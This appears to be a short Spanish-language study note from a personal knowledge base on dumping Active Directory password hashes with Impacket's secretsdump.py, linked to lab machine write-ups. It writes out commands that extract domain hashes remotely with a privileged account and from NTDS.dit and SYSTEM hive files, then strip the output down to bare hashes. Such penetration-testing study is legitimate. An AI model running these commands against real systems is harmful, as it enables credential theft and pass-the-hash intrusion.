Esta herramienta sirve para dumpear los hashes de todos los usuarios del dominio utilizando las credenciales de un usuario y contraseña que tengan el permiso para ello
# Extracción hash secretdump
```
secretsdump.py -just-dc backup@10.10.143.170
```
![[Pasted image 20240717113907.png]]

[[MAQUINA ATTACKTIVE DIRECTORY(enum4linux, kerbrute enumerar usuarios, ASREPRoasting obtener TGT, john the ripper, smbclient para listar recursos compartidos, secredump dumpear hashes y pass the hash)]]


------
# Extracción hashes archivos SYSTEM y NTDS
```
secretsdump.py -system system.hive -ntds ntds.dit LOCAL | tee hashdump.txt
```
![[Pasted image 20240731091458.png]]

Y ahora depuraremos la salida del comando para obtener unicamente los hasehes
```
cat hashdump.txt | cut -d':' -f4 | tee final_hash.txt
```
![[Pasted image 20240731092505.png]]

[[MAQUINA RAZORBLACK (Explotación servicio kerberos, montura de sistema de archivos,  acceso por pass-the-hash y escalada de privilegios explotando permiso SeBackupPrivilage)]]